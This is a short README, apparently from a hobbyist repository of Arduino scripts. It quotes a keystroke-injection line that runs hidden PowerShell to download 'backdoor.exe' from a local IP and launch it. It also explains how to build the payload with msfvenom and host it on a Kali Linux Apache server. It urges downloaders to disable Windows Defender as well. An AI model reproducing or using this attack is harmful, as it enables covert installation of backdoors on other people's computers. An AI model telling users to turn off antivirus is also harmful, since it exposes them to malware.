# arduino-scripts
all the arduino scripts that i have made for you guys!
also when you download turn off windows Defender because all files are safe but the PAYLOAD.ino file is flagges because of this string of code   Keyboard.print
("powershell -windowstyle hidden c~/; (new-object System.Net.WebClient).DownloadFile('http://192.168.1.139/backdoor.exe','backdoor.exe'); Start-Process \"backdoor.exe\" ");
as i said this if yor you to host a payload on your apache server and to remostly deploy it on other computer by puging in arduino change the ip to your kali loinux ip and make msfvenom exe and name it backdoor.exe put it on apache server then start here where it says 192.168.1.139 make that your kali linux ip
